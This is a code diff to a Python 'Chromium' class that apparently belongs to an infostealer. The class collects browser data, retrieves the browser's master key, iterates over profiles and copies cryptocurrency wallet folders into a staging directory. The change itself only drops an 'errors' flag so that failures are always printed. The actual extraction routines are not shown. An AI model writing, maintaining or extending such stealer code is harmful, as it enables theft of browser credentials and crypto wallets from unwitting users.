@@ -19,7 +19,7 @@ class Chromium:
     """
     Collects data from the browser.
     """
-    def __init__(self, browser_name: str, storage_path: str, state_path: str, browser_path: str, statuses: list, errors: bool):
+    def __init__(self, browser_name: str, storage_path: str, state_path: str, browser_path: str, statuses: list):
 
         self.__browser_name = browser_name
         self.__storage_path = storage_path
@@ -27,7 +27,6 @@ class Chromium:
         self.__browser_path = browser_path
         self.__statuses = statuses
         self.__profiles = None
-        self.__errors = errors
 
         self.__config = ChromiumConfig()
         self.__path = rf"{self.__storage_path}\Browsers\{self.__browser_name}"
@@ -155,7 +154,7 @@ class Chromium:
             copy(alt_path, storage_path)
 
         else:
-            if self.__errors is True: print(f'[{self.__browser_name}]: {error}')
+            print(f'[{self.__browser_name}]: {error}')
             return False
 
         return True
@@ -399,7 +398,7 @@ class Chromium:
                 self._copy_files(filename, rf'{wallets}\{wallet["folder"]}', error="No wallets found")
 
             except Exception as e:
-                if self.__errors is True: print(f"[{self.__browser_name}]: {repr(e)}")
+                print(f"[{self.__browser_name}]: {repr(e)}")
 
     def _process_profile(self, profile: str) -> None:
         """
@@ -456,7 +455,7 @@ class Chromium:
                 function["method"](*function["arguments"])
 
             except Exception as e:
-                if self.__errors is True: print(f"[{self.__browser_name}]: {repr(e)}")
+                print(f"[{self.__browser_name}]: {repr(e)}")
 
     def _check_profiles(self) -> None:
         """
@@ -464,7 +463,7 @@ class Chromium:
         :return: None
         """
         if not self.__profiles:
-            if self.__errors is True: print(f"[{self.__browser_name}]: No profiles found")
+            print(f"[{self.__browser_name}]: No profiles found")
             return
 
         self.__master_key = self._get_key()
@@ -483,4 +482,4 @@ class Chromium:
             self._check_profiles()
 
         except Exception as e:
-            if self.__errors is True: print(f"[{self.__browser_name}]: {repr(e)}")
+            print(f"[{self.__browser_name}]: {repr(e)}")
